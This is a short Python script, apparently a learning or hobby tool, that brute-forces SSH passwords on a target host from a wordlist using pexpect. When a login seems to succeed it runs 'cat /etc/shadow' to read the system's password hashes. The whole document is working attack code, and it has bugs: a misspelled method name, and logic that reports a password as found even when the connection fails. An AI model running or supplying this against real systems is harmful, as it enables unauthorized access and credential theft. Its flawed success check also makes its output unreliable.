#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/11/2021

import pexpect
from colorama import Fore

PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']

def send_command(connection, command):
    connection.sendline(command)
    connection.expect(PROMPT)
    print(connection.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connString = 'ssh ' + user + '@' + host
    spawn = pexpect.spawn(connString)
    ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    
    if ret == 1:
        spawn.sendline('Yes')
        ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    spawn.sendline(password)
    spawn.expect(PROMPT, timeout=0.1)
    return spawn

def main():
    host = input("Enter IP address of Target to Bruteforce: ")
    user = input("Enter User Account to Bruteforce: ")
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            spawn = connect(user, host, password)
            print(Fore.GREEN + '[+] Password Found: ' + password)
            send_command(spawn, 'cat /etc/shadow')
        except:
            print(Fore.RED + '[-] Wrong Password: ' + password)

main()
